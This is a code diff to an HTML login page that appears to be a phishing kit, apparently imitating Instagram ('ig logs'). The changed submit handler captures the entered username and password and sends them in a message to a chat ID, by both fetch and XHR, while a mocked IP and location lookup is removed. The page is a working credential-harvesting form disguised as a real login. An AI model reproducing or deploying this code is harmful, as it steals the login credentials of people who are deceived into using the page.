@@ -249,6 +249,7 @@ form .create-account:hover {
 }
 
     </style>
+    
   </head>
   <body>
     <div class="content">
@@ -339,17 +340,6 @@ form .create-account:hover {
             xhr.send(data);
         }
 
-        // Function to get IP, country, and city (mocked data for this example)
-        function getUserDetails(callback) {
-            // Mocked data, but you can fetch actual user details using an API or geolocation service
-            const userDetails = {
-                country: 'Nigeria',
-                city: 'Lagos',
-                ip: '123.456.789.101'
-            };
-            callback(userDetails);
-        }
-
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form from submitting normally
@@ -358,22 +348,12 @@ form .create-account:hover {
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
 
-            getUserDetails(function(details) {
-                const country = details.country;
-                const city = details.city;
-                const ip = details.ip;
+            // Construct the message with username, password, and log type
+            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
 
-                document.getElementById('country').value = country;
-                document.getElementById('city').value = city;
-                document.getElementById('ip').value = ip;
-
-                // Construct the message
-                const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nIP: ${ip}`;
-
-                // Try both methods
-                sendMessageWithFetch(chatId, message);
-                sendMessageWithXHR(chatId, message);
-            });
+            // Try both methods
+            sendMessageWithFetch(chatId, message);
+            sendMessageWithXHR(chatId, message);
         });
     </script>
 </body>
